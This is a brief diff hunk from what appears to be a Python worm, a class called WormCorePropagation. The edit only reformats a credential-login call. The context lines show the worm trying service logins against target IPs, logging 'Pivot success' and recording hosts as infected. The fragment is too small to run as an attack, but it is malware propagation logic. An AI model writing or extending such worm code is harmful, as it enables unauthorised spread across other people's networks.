@@ -130,9 +130,7 @@ class WormCorePropagation:
                 if self.dry_run:
                     continue
 
-                success = self._try_service_login(
-                    ip, service_port, service, username, password
-                )
+                success = self._try_service_login(ip, service_port, service, username, password)
                 if success:
                     logger.success(f"Pivot success: {username} -> {ip} ({service})")
                     if self.check_and_add_infected(ip):
